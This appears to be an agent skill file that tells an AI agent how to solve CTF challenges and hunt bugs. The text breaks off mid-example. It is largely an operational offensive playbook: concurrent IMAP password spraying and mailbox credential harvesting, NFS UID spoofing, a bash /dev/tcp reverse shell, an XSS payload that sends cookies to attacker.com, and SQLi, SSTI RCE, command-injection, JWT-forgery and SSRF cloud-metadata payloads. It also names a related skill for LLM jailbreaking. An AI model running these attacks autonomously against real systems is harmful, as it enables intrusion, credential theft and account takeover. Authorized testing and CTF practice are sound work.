---
name: bugbounty-ctf
description: "Use when solving CTF challenges, practicing bug bounty hunting, analyzing vulnerabilities, writing exploit code, or performing authorized security assessments. Covers web vulns, crypto, pwn, reverse engineering, forensics, OSINT, and exploit development methodology."
version: 7.0.0
author: Hermes Agent
license: MIT
platforms: [linux, macos]
metadata:
  hermes:
    tags: [ctf, bug-bounty, security, exploit, web-hacking, reverse-engineering, forensics, cryptography, pwn, osint, vulnerability-research]
    related_skills: [godmode, systematic-debugging, codebase-inspection]
---

# Bug Bounty & CTF Skill

Operational methodology for Capture The Flag challenges and authorized bug bounty hunting. **Black-box first** — discover vulnerabilities through testing, not by reading source code. Source code review is a separate discipline (`codebase-inspection`).

## When to Use This Skill

Trigger when the user:
- Asks for help solving a CTF challenge (any category)
- Wants to hunt bugs on a bug bounty program
- Needs to analyze a binary, crack encryption, or decode obfuscated data
- Wants to write exploit code (buffer overflow, ROP chain, shellcode)
- Asks about vulnerability scanning, fuzzing, or recon methodology
- Needs help with reverse engineering (Ghidra, radare2, IDA patterns)
- Wants to analyze network captures, memory dumps, or disk images
- Mentions specific vuln classes: SQLi, XSS, SSRF, RCE, LFI, IDOR, SSTI, XXE, deserialization

**Don't use for:** LLM jailbreaking (use `godmode`), general code debugging (use `systematic-debugging`), or reading source code for bugs (use `codebase-inspection`).

## Philosophy: Discover, Don't Read

If source code is available, **you still test like you don't have it**. Reading `canonical_exploit()` or `mark_exploited()` isn't hacking — it's reading the answer key. The skill of a pentester is finding bugs through observation, testing, and analysis. Source code can confirm your findings afterward, but it should never replace the discovery process.

## Quick Reference: CTF Categories

| Category | What It Is | Key Skills |
|:---------|:-----------|:-----------|
| **Web** | Exploit web app vulnerabilities | HTTP, SQL, JS, deserialization, auth bypass |
| **Crypto** | Break or abuse cryptographic systems | XOR, RSA, AES modes, padding oracle, ECC |
| **Pwn** | Binary exploitation | Buffer overflows, ROP, format strings, heap |
| **Rev** | Reverse engineer binaries | Disassembly, decompilation, crackme, unpacking |
| **Forensics** | Extract hidden data from artifacts | PCAP, memory dumps, steganography, disk images |
| **OSINT** | Open-source intelligence gathering | Google dorks, metadata, geolocation, social engineering |
| **Misc** | Everything else | Programming puzzles, encoding, logic, trivia |

## Step 0: Auto-Detect Challenge Type

Before diving in, let the tooling tell you what you're dealing with:

```python
exec(open("${HERMES_SKILL_DIR}/references/ctf_helper.py").read())

result = analyze_challenge("/path/to/challenge_file")
print(result["category"])       # "pwn/rev", "crypto", "forensics"
print(result["suggestions"])    # Specific next steps
print(result.get("found_flags")) # If flag is in strings!
```

This runs `file`, `strings`, pattern matching for flags/base64/hex, and extension-based heuristics. Always start here — it catches the easy flags hiding in plaintext.

## Step 0.4: Run Attacks Inside kalibox — Never Use Host `sudo`

**All offensive and privileged commands run inside the `kalibox` container, not
on the host.** This keeps the agent from scattering `sudo` calls across the
machine. Do **not** run `sudo`, `mount`, `docker --privileged`, or package
installs on the host. `kalibox` is a persistent Kali container (`--privileged
--network host`, so it already sees the VPN and reaches `10.129.x.x`) that is
disposable — you can destroy it at any time. Note this is an operational
convenience, **not** a security sandbox: docker-group access and `--privileged`
are equivalent to host root.

```bash
kalibox up                              # first run: pulls Kali + installs the toolset (once)
kalibox nmap -sCV -p- 10.129.33.77      # run any offensive tool inside the box
kalibox status                          # check container state
kalibox shell                           # interactive Kali shell when you need one
kalibox destroy                         # tear it down
```

Anything that needs root (NFS/SMB mounts, raw sockets, installing a tool) goes
**through kalibox**, where it runs as root *in the container* and keeps those
operations off the host's `sudo`. A host work dir is bind-mounted at `/work`, so
files written there are retrievable on the host without `docker cp`.

From Python (e.g. to mount + scan NFS without host root):

```python
from bugbounty_ctf.kalibox import KaliBox

box = KaliBox().ensure()
box.run(["mount", "-t", "nfs", "-o", "vers=3,nolock,ro",
         "10.129.33.77:/srv/nfs/onboarding", "/work/nfs"])   # root inside the container
print(box.run("ls -laR /work/nfs").stdout)                   # loot is also on the host at ~/.hermes/kalibox/work/nfs
```

**Vhosts: do NOT edit `/etc/hosts` (it needs host sudo).** Adding
`10.129.x.x enigma.htb` to `/etc/hosts` is the #1 reason an agent hits a sudo
prompt — and it's unnecessary. Resolve vhosts with the Host header instead:
- Toolkit: `SecurityScanner("http://10.129.34.19/", headers={"Host": "enigma.htb"})`
  then `map_surface(...)` / `discover_content(...)`.
- Raw tools: `curl -H "Host: enigma.htb" …`, `gobuster -H "Host: enigma.htb" …`,
  `kalibox ffuf -H "Host: enigma.htb" …`.
- If a tool genuinely needs name resolution, add the entry **inside kalibox**
  (root there, no host sudo): `kalibox shell -c "echo '10.129.34.19 enigma.htb' >> /etc/hosts"`.

**Rule:** if a command would need `sudo` or special capabilities on the host,
prefix it with `kalibox` instead — never answer a host sudo prompt. The earlier
failure modes — editing `/etc/hosts`, `mount.nfs` not being setuid, `sudo -n`,
`docker --privileged` on the host — are exactly what kalibox eliminates.

## Step 0.5: Triage the Surface — Web is Not the Only Track

```python
from bugbounty_ctf.api import select_tracks
tracks = select_tracks(ports=open_ports, tech=tech_hints)   # executable form of the table below
# fan out the parallel_safe tracks (see Delegate section); each track.instruction says what to run
```

**Let `detect_surface` do the nmap — don't hand-build the surface yourself.**
The toolkit now auto-detects the surface.  One call feeds the whole autonomous
loop with zero manual nmap parsing:

```python
from bugbounty_ctf.recon import detect_surface
from bugbounty_ctf.skill_runner import SkillOrchestrator

surface = detect_surface("10.129.x.x")   # nmap -sV -oX inside kalibox; TCP fallback if absent
runner = SkillOrchestrator("http://10.129.x.x/")
result = runner.run(*surface.for_run())  # ports + tech auto-fed

# Or let run() autodetect itself (passes ports/tech from nmap automatically):
result = runner.run()   # same — detect_surface called internally when no ports/tech given
```

`surface.tech` uses the same playbook vocabulary tokens — `version-banner` fires
the `cve` track automatically for any service with a version string.

**Before defaulting to web exploitation, look at what the host actually exposes.**
Many boxes (HTB, pentest scopes) have *no exploitable web app* — the path is
through infrastructure services (NFS, mail, SMB, RPC) or a versioned product
with a known CVE. If you `nmap` a host and reach for `gobuster`/`curl` on a
static brochure site, **stop and triage first**:

| Surface | Track | Toolkit entry point |
|:--------|:------|:--------------------|
| Web app with forms/params/APIs | Step 1 (web) | `SecurityScanner`, `discover_content`, `map_surface` |
| NFS export (2049/111) | Infra → NFS below | `NFSEnumerator` |
| IMAP/POP3/SMTP (25/110/143/993/995) | Infra → Mail below | `MailEnumerator` |
| Any service with a version banner | CVE correlation below | `correlate_cves`, `nuclei_scan` |

**Use the toolkit — do not hand-roll these in bash.** The modules below were
built from live engagements specifically because improvised bash flails on them
(serial mail spray times out; NFS mount mechanics eat 10+ minutes). They are
already installed and importable: `from bugbounty_ctf.api import ...`.

**These tracks are independent — run them in parallel.** Don't enumerate NFS,
then mail, then web one after another in your own context. Fan them out to
concurrent sub-agents with `SkillOrchestrator.fan_out(...)` (see the
"Delegate independent work to PARALLEL sub-agents" section) and merge the
results. This is the single biggest fix for a run that stalls.

### Infra → NFS enumeration

```python
from bugbounty_ctf.nfs_enum import NFSEnumerator

nfs = NFSEnumerator("10.10.10.10")           # container execution by default
exports = nfs.list_exports()                 # showmount -e (in kalibox)
for path in nfs.candidate_mounts(exports):   # advertised + parents + common roots
    print("try:", path)                      # servers often serve parents they don't advertise

report = nfs.mount_and_scan("/srv/nfs/onboarding")  # mount + scan inside kalibox
print(report["scan"]["ssh_keys"], report["scan"]["uid_locked"])
```

**Privileged mounts run inside kalibox automatically** (`NFSEnumerator` uses
`KaliEnv` by default). `mount_and_scan` now mounts at `/mnt/nfs_*` and scans
**inside** the container — an NFS submount under the `rprivate` `/work` bind
mount does not propagate to the host, so a host-side scan would see an empty
dir. The scan now actually finds the files behind that bind mount; no behavior
change for the caller and the same `{"mount": ..., "scan": ...}` return shape.
The high-value output is
`report["scan"]["uid_locked"]`: files you *can't* read, with the **owner UID to
spoof**. The classic NFS attack is AUTH_SYS UID-spoofing — create a local user
with that UID (or run as it) and re-read. Don't stop at "permission denied."

### Infra → Mail enumeration (IMAP/POP3)

```python
from bugbounty_ctf.mail_enum import MailEnumerator

mail = MailEnumerator("10.10.10.10")                 # IMAP4_SSL :993 by default
valid = mail.spray(users, ["Welcome2024!", "Changeme123"], workers=12)  # CONCURRENT
for user, pw in valid:
    loot = mail.harvest(user, pw)                    # dumps mailboxes, extracts secrets
    print(loot["private_keys"], loot["credentials"], loot["attachments"])
```

Spraying is concurrent on purpose — **serial spraying over TLS times out**.
Onboarding/default passwords are usually shared across users, so spray a small
password list across all discovered users at once. `harvest()` pulls SSH keys
and credential-shaped lines out of every mailbox and attachment.

### Version banner → CVE correlation & template scan

```python
from bugbounty_ctf.template_scan import correlate_cves, nuclei_scan, builtin_template_scan

# Self-contained: bundled CVE DB (offline). Pass online=True to refresh from NVD.
cves = correlate_cves([{"product": "roundcube", "version": "1.6.10"}])  # → CVE-2025-49113

# nuclei auto-installs + updates templates; builtin_template_scan is dependency-free.
findings = nuclei_scan("http://target/")             # falls back gracefully if offline
findings += builtin_template_scan("http://target/")  # bundled generic exposure templates
```

Always correlate service versions against `correlate_cves` before assuming a
service is a dead end — a patched-looking banner may still match a known CVE.

### Product-specific probes

Use focused product probes when the fingerprint names a product with known
unauthenticated exposure patterns. Langflow is covered by `LangflowProbe`:

```python
from bugbounty_ctf.api import LangflowProbe, LangflowProbeConfig

probe = LangflowProbe(
    "http://target/",
    config=LangflowProbeConfig(public_flow_ids=("known-public-flow-id",)),
)
print(probe.fingerprint())
print(probe.check_unauth_exposure())
print(probe.check_public_build_exec())
```

The Langflow build-exec check is benign-only: it self-issues a `client_id`
cookie and uses a `time.sleep(N)` timing oracle. Treat confidence as `high` only
when the measured build-duration delta confirms execution; otherwise keep it
`unconfirmed`.

## Step 1: Web Exploitation — Black-Box Methodology

### Phase 0: Load Testing Engine

Before manual testing, load the automated security testing engine:

```python
from bugbounty_ctf import SecurityScanner
from bugbounty_ctf.api import (
    test_login_sqli, test_ssti, test_command_injection, test_path_traversal,
    test_nosqli, test_ldap_injection, test_ssrf, test_xss, test_idor,
    test_graphql_alias_batch, test_cors, test_open_redirect,
    discover_content, map_surface,
    detect_defenses, test_race_condition, test_xxe,
    test_pickle_deserialization, test_yaml_deserialization,
    test_jwt_attacks, test_file_upload,
    decode_jwt, forge_jwt_alg_none, forge_jwt_hs256,
    ChainContext, generate_report, save_report,
)

scanner = SecurityScanner("http://target/")
```

**HTB targets = IP + vhost.** Set the `Host` header on the scanner, then drive
discovery in-process (no shelling out to gobuster):

```python
from bugbounty_ctf import SecurityScanner
from bugbounty_ctf.api import map_surface, discover_content
# HTB = IP + vhost: set the Host header on the scanner, then use IN-PROCESS discovery
scanner = SecurityScanner("http://10.129.34.19/", headers={"Host": "enigma.htb"})
surface = map_surface("http://10.129.34.19/", scanner=scanner)
found   = discover_content("http://10.129.34.19/", scanner=scanner)  # bundled wordlist, no gobuster needed
```

- Prefer in-process `discover_content` (ships its own `dirbrute` wordlist) over `gobuster` in kalibox — avoids wordlist-path guessing. If you DO need gobuster, SecLists is at `/usr/share/seclists/...` inside kalibox.
- Mail spray: get candidate USERS from recon first (NFS onboarding docs, emails on the site like `support@enigma.htb`), and keep the password list SMALL (≤~15). A 30×75 blind spray over TLS times out even though `spray()` is concurrent.
- NFS: if the advertised export is empty, try `nfs.candidate_mounts(exports)` (parents/siblings like `/srv/nfs`, `/home`) — servers often serve paths `showmount` doesn't list.

**Quick testing functions available after loading:**
- `test_login_sqli(url, scanner=scanner)` — Test login form for SQL injection
- `test_ssti(url, method, param_name, scanner=scanner)` — Test for SSTI
- `test_command_injection(url, method, param_name, scanner=scanner)` — Test for command injection
- `test_path_traversal(url, method, param_name, scanner=scanner)` — Test for path traversal
- `test_nosqli(url, scanner=scanner)` — Test JSON login for NoSQL injection
- `test_ldap_injection(url, scanner=scanner)` — Test for LDAP injection
- `test_ssrf(url, method, param_name, scanner=scanner)` — Test for SSRF
- `test_xss(url, method, param_name, scanner=scanner)` — Test for XSS with 8-level filter-bypass escalation
- `test_idor(url_template, scanner=scanner)` — Test for IDOR (sequential ID probing)
- `test_graphql_alias_batch(url, query_template, scanner=scanner)` — GraphQL alias-batch brute force
- `OASTServer()` + `test_blind_ssrf/_rce/_xxe(url, scanner=scanner, oast=oast)` — Out-of-band confirmation of blind SSRF / RCE / XXE via a per-token callback listener
- `test_cors(url, scanner=scanner)` — Detect CORS misconfigurations (origin reflection, `null` trust, credentialed wildcard)
- `test_open_redirect(url, scanner=scanner)` — Probe redirect params (next/url/redirect/…) with bypass payloads, confirm Location points off-site
- `discover_content(base_url, scanner=scanner)` — Directory/content brute force using the bundled `dirbrute` wordlist (auto-filters catch-all routing responses). **Bounded by default** (~4000 paths / 90s wall-clock budget) so a bare call no longer times out on the 43k-entry list; pass `limit=-1` for a full sweep when a quick pass finds nothing.
- `map_surface(base_url, scanner=scanner)` — Map attack surface (forms, links, tech)

**Advanced functions:**
- `detect_defenses(base_url, scanner=scanner)` — Fingerprint WAF, rate limit, input filters, missing security headers
- `test_race_condition(url, data=..., workers=30)` — Concurrent request race testing with success counting
- `test_xxe(url, scanner=scanner)` — XXE with multiple entity payloads (file://, php://filter, parameter entities)
- `test_pickle_deserialization(url, param_name, scanner=scanner)` — Python pickle RCE probe (uses benign marker file, not real RCE)
- `test_yaml_deserialization(url, param_name, scanner=scanner)` — PyYAML unsafe_load probe
- `test_jwt_attacks(url, token, scanner=scanner)` — JWT alg=none, weak HS256 secret bruteforce
- `decode_jwt(token)` / `forge_jwt_alg_none(payload)` / `forge_jwt_hs256(payload, secret)` — JWT utilities
- `test_file_upload(url, file_field, scanner=scanner)` — Upload bypass variants + RCE verification
- `ChainContext()` — Carry tokens/credentials/findings across exploits; `.try_endpoints_with_token()` auto-tests captured tokens against admin endpoints
- `generate_report(scanner)` / `save_report(scanner)` — Markdown or JSON severity-ranked reports

**Direct engine usage:**
```python
scanner = SecurityScanner("http://target/")

# Test with custom payloads
baseline = scanner.get_baseline("POST", "http://target/login", data={"user": "test"})
results = scanner.run_payload_set(baseline, "POST", "http://target/login", 
                                   {"sqli": "' OR 1=1--", "ssti": "{{7*7}}"}, "user")

# Get findings
print(scanner.get_summary())
```

### Knowledge Base

Query the reference methodology docs before testing to find relevant exploit paths:

```python
from bugbounty_ctf.knowledge import KnowledgeBase

kb = KnowledgeBase()

# Full-text search across all reference docs
results = kb.search("nginx-ui authentication bypass")

# Get methodology suggestions based on detected tech
suggestions = kb.suggest_methodology(["nginx", "Flask/Python (Werkzeug)", "Jinja2"])
for s in suggestions:
    print(f"  {s['filename']} — {s['section']}")
    print(f"  {s['snippet']}")
```

### Multi-Agent Skill Orchestrator

When running as a Hermes skill, use the SkillOrchestrator to guide testing
through 4 phases. You own the loop. For independent tracks, fan them out by
default (`SkillOrchestrator.run(mode='auto', ports=..., tech=...)` selects
playbook tracks and fans out the parallel-safe ones); reason in-process only for
dependent/sequential work like exploit chaining. The orchestrator provides phase
guidance with RAG context and scanner state, and you execute the instructions
using the toolkit functions:

```python
from bugbounty_ctf.skill_runner import SkillOrchestrator

runner = SkillOrchestrator("http://target/")

# Phase 1: Recon — map the attack surface
guidance = runner.get_recon_guidance()
# Execute the guidance instructions using scanner.map_surface(), detect_defenses(), etc.

# Phase 2: Research — query the knowledge base
guidance = runner.get_research_guidance()
# The guidance includes RAG results — use them to prioritize tests

# Phase 3: Fuzz — test payloads
guidance = runner.get_fuzz_guidance()
# Execute scan_endpoint() and test_ssrf() on discovered endpoints

# Phase 4: Exploit — chain findings
guidance = runner.get_exploit_guidance()
# Chain confirmed vulnerabilities into exploit paths

# Collect final results
results = runner.collect_results()
runner.save_results()
```

The orchestrator automatically:
- Queries the FTS5 knowledge base for methodology at each phase
- Injects scanner state (findings, surface, WAF status) into guidance
- Tracks findings in SQLite (ScannerDB) for cross-target analysis
- Runs SSRF + AWS metadata extraction when URL parameters are found

#### Second-brain loop (recall + write-back)

The toolkit learns across runs rather than starting cold each time:

- **Recall** — at recon/research, the orchestrator pulls prior memory for the
  same host out of `ScannerDB` and injects it into the guidance and sub-agent
  prompt: prior **findings** ("re-check these first"), resolved **hypotheses**
  (confirmed → re-check, rejected → skip the known dead ends), and
  high-confidence **observations** (with their next-test hints). Findings are
  de-duplicated on `(host, endpoint, vuln_type, payload)` so the memory stays
  clean and a repeat scan refreshes a row instead of appending.
- **Write-back** — after the verification pass, each *confirmed* finding is
  synthesized into a lesson and written into the knowledge base
  (`KnowledgeBase.add_lesson`, stored as a `learned::` doc). Lessons survive
  `reindex()` and are surfaced by `search()` / `suggest_methodology()`, so a
  future engagement against similar tech recalls what actually worked — not just
  the static reference corpus.
- **Dead-end feedback** — fan-out tracks that return an empty findings block or
  a track error write a per-host `dead-end` lesson to the knowledge base. Later
  recon/research guidance lists those track ids as deprioritized, advisory
  memory. If a later run produces findings for that track, the stale dead-end is
  cleared so surface changes do not poison future runs.
- **Durable reasoning** — `ObservationStore(db=scanner.db, target_host=...)`
  and `HypothesisEngine` persist observations and confirmed/rejected hypotheses
  to `ScannerDB` (`query_observations` / `query_hypotheses`), so the agent's
  reasoning survives process restarts instead of evaporating.
- **Provenance** — findings carry a `source` field (the methodology doc / phase
  that led to them), persisted alongside the finding for later audit.
- **Retention** — `ScannerDB.prune_history(host, keep=N)` trims the unbounded
  test-history log so the memory store stays clean.
- **Optional semantic search** — `KnowledgeBase(embedder=fn)` enables a hybrid
  retrieval mode: FTS5 supplies recall candidates, the embedder reranks them by
  cosine similarity (vectors cached in `doc_vectors`). Fully optional — no ML
  dependency is added.

#### Autonomous mode: spawn one Hermes sub-agent per phase

For headless/unattended runs (cron, CI, batch targets) where no interactive
Hermes agent is driving, the orchestrator can spawn a dedicated Hermes
sub-agent (`hermes -z`) for each phase:

```python
runner = SkillOrchestrator("http://target/")
final = runner.run_with_agents(timeout_per_phase=180)  # recon → research → fuzz → exploit → verify
print(final["total_findings"], final["confirmed_findings"], final["refuted_findings"])
```

How the sub-agent workflow stays coherent:
- **Lazy guidance** — each phase's prompt is built from the *current* scanner
  state, so the fuzz/exploit agent sees what the recon/research agent found
  (not a stale upfront snapshot).
- **Structured output contract** — each sub-agent must end its reply with a
  machine-readable `<FINDINGS>[…]</FINDINGS>` JSON block. The orchestrator
  parses and merges it (deduped by type+endpoint+payload) so feed-forward is
  robust even if an agent never touches the shared DB.
- **Shared persistence** — every sub-agent is also told (via a bootstrap block
  in its prompt) to construct its `SecurityScanner` with the orchestrator's
  exact `state_file` and `ScannerDB` path. The orchestrator reloads that state
  after each phase, so findings genuinely feed forward and the final report
  aggregates all phases.
- **Adversarial verification** — with `verify=True` (default), every merged
  finding is then put to a panel of skeptic sub-agents prompted to *refute* it
  (`verify_votes` per finding); majority-refuted findings move to
  `refuted_findings`, the rest to `confirmed_findings`. Cuts plausible-but-wrong
  results before reporting.
- **Fails closed** — if the `hermes` binary is missing it raises
  `SkillOrchestrator.HermesNotFoundError` (caught by `run_with_agents`, which
  returns an `agent_error`) instead of silently recording empty phases.

`SkillOrchestrator.run(...)` is the single autonomous entry that dispatches for
you: `run(mode='auto', ports=..., tech=...)` selects playbook tracks and fans
out the parallel-safe ones (falling back to the per-phase flow when there are
fewer than two), `run(mode='fanout', ports=..., tech=...)` always fans out, and
`run(mode='headless')` always runs the per-phase agent flow. Use the in-process
`get_*_guidance()` flow when you are driving interactively and reasoning through
dependent/sequential work yourself.

#### Delegate independent work to PARALLEL sub-agents (do not do everything yourself)

You own the loop, but do not grind every service serially in your own context —
that fills your context window and serial work (e.g. one mount/spray at a time)
is what makes a run stall. Parallelise independent tracks (NFS, mail, web, CVE)
with **one synchronous call**.

**Delegate with `SkillOrchestrator.run(...)` — NOT the harness `delegate_task`
tool.** This is the single most important rule for not stalling. After the port
scan, make exactly one blocking call:

```python
from bugbounty_ctf.skill_runner import SkillOrchestrator

runner = SkillOrchestrator("http://10.129.34.19/")
result = runner.run(mode="auto", ports=open_ports, tech=tech_hints)
# ONE blocking call. Internally: select_tracks(ports, tech) → synchronous fan_out
# of the parallel-safe tracks → findings merged into runner.scanner. Returns in
# THIS turn with {"merged": N, "responses": {...}, "selected_tracks": [...]}.
for f in runner.scanner.findings:      # act on the merged result NOW
    print(f["type"], f.get("endpoint"))
# → then CONTINUE in the same turn to the exploit phase. Do not stop here.
```

**Why one synchronous call, and never the background `delegate_task`:** Hermes
forces a top-level agent's `delegate_task` into *background* mode — it dispatches
fire-and-forget and leaves your loop idle ("I'll resume when they finish. Keep
chatting"), and the run **does not continue on its own**. `runner.run(...)` (and
the `fan_out`/`hermes -z` it uses underneath) is **synchronous**: it blocks,
runs all tracks concurrently, merges their `<FINDINGS>`, and **returns in the
same turn** — so you keep driving straight into exploitation. Wall-clock is the
slowest single track, not their sum, and your own context stays clean.

`run(mode="auto", ports, tech)` picks the dispatch for you: ≥2 parallel-safe
playbook tracks → fan them out; otherwise the per-phase flow. If you need custom
tracks, call `runner.fan_out([(label, instruction), …])` directly — it has the
same synchronous, returns-in-this-turn contract. Either way: **delegating is one
step of the loop, not the end — act on the merged findings and proceed.**

### Phase 1: Reconnaissance (Map the surface)

**1. Get every page.** Visit every URL you can find — the landing page, any linked pages, common paths.

```python
import requests

base = "http://target/"
# Start with the root page
r = requests.get(base, timeout=5)
# Extract all hrefs, form actions, script srcs
import re
hrefs = re.findall(r'href="([^"]*)"', r.text)
actions = re.findall(r'action="([^"]*)"', r.text)
scripts = re.findall(r'src="([^"]*)"', r.text)
```

**2. Check every endpoint.** For each discovered URL, try GET and POST. Note status codes, response lengths, content types.

```python
paths = ["/", "/login", "/api", "/admin", "/upload", "/profile", "/search"]
for p in paths:
    r = requests.get(base + p, timeout=5)
    print(f"GET {p}: {r.status_code} len={len(r.text)} ct={r.headers.get('Content-Type')}")
```

**3. Extract every input point.** Every form field, every URL parameter, every header, every cookie is a potential vulnerability.

```python
# Find all form inputs
inputs = re.findall(r'<input[^>]*name="([^"]*)"[^>]*>', r.text)
textareas = re.findall(r'<textarea[^>]*name="([^"]*)"', r.text)
# Find hidden fields too — they often hold important tokens
hidden = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]*)"[^>]*value="([^"]*)"', r.text)
```

**4. Technology fingerprinting.** Check response headers for server info, framework hints.

```python
for k, v in r.headers.items():
    print(f"  {k}: {v}")
# Key headers: Server, X-Powered-By, Set-Cookie format, Content-Type
# Werkzeug = Flask/Python, nginx = possibly PHP, Tomcat = Java
```

### Phase 2: Vulnerability Testing (Test every input)

Test in this order — highest ROI first:

| # | Test | Payload | What to look for |
|:--|:-----|:--------|:-----------------|
| 1 | SQL Injection | `'`, `' OR 1=1--` | Error messages, different response length, auth bypass |
| 2 | Command Injection | `; id`, `| id` | `uid=` in response, execution timing |
| 3 | SSTI | `{{7*7}}` | `49` in rendered output |
| 4 | Path Traversal | `../../../etc/passwd` | `root:` in response |
| 5 | SSRF | `http://127.0.0.1` | Internal service responses, metadata access |
| 6 | XSS | `<svg onload=alert(1)>` | Script execution, reflected input |
| 7 | Auth Bypass | `' OR '1'='1`, `{"$ne":null}` | Login without valid credentials |
| 8 | IDOR | Change user_id=1 → 2 → 42 | Other users' data accessible |
| 9 | XXE | `<!DOCTYPE root [<!ENTITY x SYSTEM "file:///etc/passwd">]>` | File contents in response |
| 10 | Deserialization | Pickled/Marshaled objects | Command execution |

**For each input, always test:**
- The baseline (normal input) — record status code, length, response time
- A single quote `'` — triggers SQL/parse errors
- Template syntax `{{7*7}}` — triggers SSTI
- Path traversal `../../../etc/passwd` — triggers LFI
- The payload — whatever makes sense for the input type

**Compare every response to the baseline.** A different length, status code, or error message means you found something.

### Phase 3: Exploitation Chain

Once you find a vulnerability, use it to access more surface:
- SQLi → dump credentials → login as admin
- IDOR → find admin token → access admin endpoints
- XSS → steal session → impersonate user
- SSRF → access internal APIs → find more vulns
- File upload → webshell → RCE

### Phase 4: Post-Exploitation & Privilege Escalation (after you get RCE)

**Getting a webshell/RCE is not the end — it is the start of post-ex. Do not
keep firing one-off stateless `webshell.php?c=` GETs (re-auth per command is slow
and brittle). Establish a stable shell, then run the local-privesc playbook.**

**1. Upgrade to a stable shell.** Catch a reverse shell in kalibox instead of
poking a stateless webshell per command:

```bash
kalibox shell -c "nc -lvnp 9001"      # listener inside the box (host-net: target reaches it)
# then trigger from your RCE (your VPN IP is visible inside kalibox):
#   bash -c 'bash -i >& /dev/tcp/<YOUR_VPN_IP>/9001 0>&1'
# stabilise: python3 -c 'import pty;pty.spawn("/bin/bash")' ; then `export TERM=xterm`
```

**2. Enumerate for escalation** — use the toolkit, don't hand-roll:

```python
from bugbounty_ctf.api import PostExploit, post_exploit_enum
# Feed it your run(cmd) (the webshell/reverse-shell command executor):
loot = post_exploit_enum(run)   # SUID, sudo -l, capabilities, cron, writable files, keys
```

**3. Reuse EVERY harvested credential against local users — the #1 HTB pivot.**
You almost always already have the password. Spray all creds you collected
(PDF, mailboxes, DB config, app configs) against every local user (`/etc/passwd`
bash users) via `su` — and `su` needs a PTY, so do NOT expect bare
`su user -c id` to work from a webshell:

```python
# from your RCE, for each (user, password) you harvested:
run('''python3 -c 'import pty,sys; pty.spawn(["su","-","haris"])' <<< "PASSWORD"''')
# or use a PTY helper; see references/suid-webshell-exploitation.md and
# references/advanced-escalation.md for the setresuid()/pty.openpty() patterns.
```

Also pivot creds you find as www-data: DB passwords (`brollin:...`), config
secrets, and reused app-admin passwords are frequently the user's system
password. SSH may be key-only (PasswordAuthentication no) — `su` is your friend
then, not `sshpass`.

**4. Escalation references** (read the one matching what you found):
`references/advanced-escalation.md` (SUID PTY, PAM, docker escapes),
`references/suid-webshell-exploitation.md` (SUID via webshell, pty),
`references/suid-sg-docker-escalation.md`, `references/docker-privilege-escalation.md`,
`references/escalate-ctf-walkthrough.md` (full SQLi→webshell→SUID→docker-root chain).
Resolve a reference path with `${HERMES_SKILL_DIR}/references/<file>`.

### Automated Recon Script

```python
from bugbounty_ctf.web_recon import recon_target, recon_report

result = recon_target("http://target.com", quick=True)
print(recon_report(result))
```

### SQL Injection — Complete Workflow

**Detection:**
```python
import requests

url = "http://target/page"
baseline = requests.get(url, params={"id": "1"}).text

payloads = ["'", "' OR 1=1--", "' OR '1'='1", "1' ORDER BY 5--"]
for p in payloads:
    r = requests.get(url, params={"id": p})
    if r.text != baseline:
        print(f"[!] DIFFERENT RESPONSE: {p} → status {r.status_code}, len {len(r.text)}")
```

**Exploitation (SQLite):**
```sql
' UNION SELECT tbl_name,2,3 FROM sqlite_master WHERE type='table'--
' UNION SELECT sql,2,3 FROM sqlite_master WHERE type='table'--
' UNION SELECT username,password,3 FROM users--
```

**Exploitation (MySQL):**
```sql
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password,3 FROM users--
```

### XSS — Filter Bypass Escalation

| Level | Payload | Bypasses |
|:------|:--------|:---------|
| 1 | `<script>alert(1)</script>` | Nothing filtered |
| 2 | `<svg onload=alert(1)>` | `<script>` blocked |
| 3 | `<details open ontoggle=alert(1)>` | Common tags blocked |
| 4 | `<img src=x onerror="fetch('//attacker.com/'+document.cookie)">` | alert() blocked |

**DOM XSS:** Find sources → sinks:
- Sources: `location.hash`, `location.search`, `document.URL`, `document.referrer`
- Sinks: `eval()`, `setTimeout()`, `innerHTML`, `document.write()`, `jQuery.html()`

### SSRF — discover the sink, then exploit (never hardcode the endpoint)

The SSRF/AWS helpers are target-agnostic: discover the sink from the surface,
characterise the filter, then exploit. Nothing about the endpoint, the filter
bypass, or any required URL suffix is baked in — you supply what recon reveals.

```python
from bugbounty_ctf.engine import find_ssrf_endpoints, get_aws_credentials

# 1. Discover URL-accepting sinks from the mapped forms/params
sinks = find_ssrf_endpoints(scanner, ["/", "/jobs"])
sink = sinks[0]            # e.g. {"url": ".../preview", "method": "POST", "param": "url"}

# 2. If recon shows the filter needs an extension (e.g. ".yaml"), pass it as a
#    suffix — this is your finding, not a tool default:
creds = get_aws_credentials(
    scanner, ssrf_endpoint=sink["url"], ssrf_param=sink["param"], url_suffix="#.yaml"
)
```

### SSRF — Cloud Metadata Targets

```bash
curl http://169.254.169.254/latest/meta-data/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
```

**Bypassing localhost filters:** `0177.0.0.1` (octal), `2130706433` (decimal), `[::ffff:127.0.0.1]` (IPv6)

### SSTI — Engine Detection

```
{{7*7}}     → 49 = Jinja2, Twig, Freemarker
${7*7}      → 49 = Freemarker, Spring EL
<%= 7*7 %>  → 49 = ERB (Ruby)
```

**Jinja2 RCE:** `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}`

### Command Injection — Payload Arsenal

**Basic:** `; id`, `| id`, `&& id`, `` `id` ``, `$(id)`

**No spaces:** `cat${IFS}/etc/passwd`, `{cat,/etc/passwd}`

### JWT Attacks

```python
import jwt

# 1. Decode without verification
payload = jwt.decode(token, options={"verify_signature": False})

# 2. Try alg=none
new_token = jwt.encode(payload, '', algorithm='none')

# 3. RS256 → HS256 (public key as HMAC secret)
new_token = jwt.encode(payload, public_key, algorithm='HS256')

# 4. Modify claims
payload["role"] = "admin"
```

### NoSQL Injection (MongoDB)

**Auth bypass** — send objects instead of strings:
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

### LDAP Injection

**Wildcard bypass:**
```
username: *
password: *
```
Filter becomes `(&(uid=*)(userPassword=*))` — matches every entry.

### SAML XML Signature Wrapping (XSW)

Wrap a legitimate SAML response in a new forged assertion:
```xml
<samlp:Response>
  <saml:Assertion ID="_attacker">
    <saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject>
